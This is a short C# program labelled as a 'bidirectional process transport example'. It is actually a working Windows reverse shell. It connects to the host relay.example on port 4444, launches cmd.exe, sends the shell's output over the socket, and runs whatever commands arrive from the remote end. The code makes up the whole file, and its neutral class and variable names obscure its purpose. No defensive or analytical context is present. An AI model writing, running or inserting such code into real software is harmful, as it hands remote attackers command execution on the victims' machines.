// Bidirectional process transport example
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

class StreamTransfer {
    static void Main() {
        string host = "relay.example";
        int port = 4444;
        using var connection = new TcpClient(host, port);
        using var transport = connection.GetStream();
        byte[] received = new byte[4096];
        int i;
        var p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/q";
        p.StartInfo.RedirectStandardInput = true;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.StartInfo.UseShellExecute = false;
        p.OutputDataReceived += (s, e) => {
                var b = Encoding.UTF8.GetBytes(e.Data + "\n");
                transport.Write(b, 0, b.Length);
        };
        p.Start();
        p.BeginOutputReadLine();
        while ((i = transport.Read(received, 0, received.Length)) != 0) {
            string commandText = Encoding.UTF8.GetString(received, 0, i);
            p.StandardInput.WriteLine(commandText);
        }
    }
}
